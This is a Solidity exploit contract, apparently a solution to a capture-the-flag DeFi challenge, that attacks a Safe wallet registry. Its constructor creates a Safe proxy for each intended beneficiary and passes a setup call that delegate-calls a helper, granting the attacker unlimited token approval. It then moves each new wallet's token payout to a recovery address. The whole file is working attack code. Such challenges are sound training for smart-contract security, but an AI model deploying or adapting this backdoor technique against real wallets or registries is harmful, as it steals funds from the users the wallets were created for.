// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {console} from "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Safe} from "safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
import {SafeProxyFactory} from "safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";

interface IWalletRegistry {
    function singletonCopy() external returns (address);
    function walletFactory() external returns (address);
    function token() external returns (IERC20);
}

contract ApproveContract {
    function approve(IERC20 token, address spender, uint256 value) external {
        token.approve(spender, value);
    }
}

contract AttackBackdoor {
    constructor(address _walletRegistry, address[] memory users, address _recovery) {
        IWalletRegistry walletRegistry = IWalletRegistry(_walletRegistry);
        Safe singletonCopy = Safe(payable(walletRegistry.singletonCopy()));
        SafeProxyFactory walletFactory = SafeProxyFactory(walletRegistry.walletFactory());
        IERC20 token = walletRegistry.token();
        ApproveContract approveContract = new ApproveContract();

        address[] memory owners = new address[](1);
        for (uint256 i = 0; i < users.length; ++i) {
            owners[0] = users[i];

            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,
                    1,
                    address(approveContract),
                    abi.encodeCall(ApproveContract.approve, (token, address(this), type(uint256).max)),
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );
            address walletAddress = address(
                walletFactory.createProxyWithCallback(
                    address(singletonCopy), initializer, 0, IProxyCreationCallback(address(walletRegistry))
                )
            );

            token.transferFrom(walletAddress, _recovery, token.balanceOf(walletAddress));
        }
    }
}
